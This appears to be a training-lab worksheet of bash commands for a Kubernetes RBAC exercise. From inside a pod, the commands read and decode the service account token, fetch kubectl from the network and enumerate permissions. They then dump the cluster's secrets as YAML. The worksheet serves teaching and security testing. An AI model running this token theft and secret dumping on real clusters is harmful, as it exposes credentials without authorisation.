# RBAC-secrets lab
- Can we access secrets?
```bash
# Check shell
echo $SHELL
# or
cat /etc/shells

PS1='\[\e[31m\]\u\[\e[96m\]@\[\e[35m\]\H\[\e[0m\]:\[\e[93m\]\w\[\e[0m\]\$ '

echo "Useful tools:"; missing=""; for i in kubectl hostname perl python python3 dpkg bash sh yq jq nmap curl wget ping apt apk openssl nc netcat sed vim vi nano base64 tar; do command -v "$i" >/dev/null 2>&1 && echo "$i" || missing="$missing $i"; done; if [ -n "$missing" ]; then echo  "Missing tools: $(echo "$missing" | sort)"; fi

apt update && apt install jq curl -y

TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)  ; jq -R 'split(".") | .[1] | @base64d | fromjson' <<< $TOKEN
```
-  Note we don't have kubectl. We can communicate directly with the API server, but thats a bit more involved.
```bash
LOS_KUBE_VERSION="v1.30.0" ; curl -LO https://dl.k8s.io/release/$LOS_KUBE_VERSION/bin/linux/amd64/kubectl && chmod +x kubectl && mv ./kubectl /usr/bin/ ; kubectl version

kubectl get pods # nope

kubectl auth can-i --list

# Discuss the difference between get/list
kubectl get secrets 

kubectl get secrets -o yaml | grep -A1 "  data:"
```

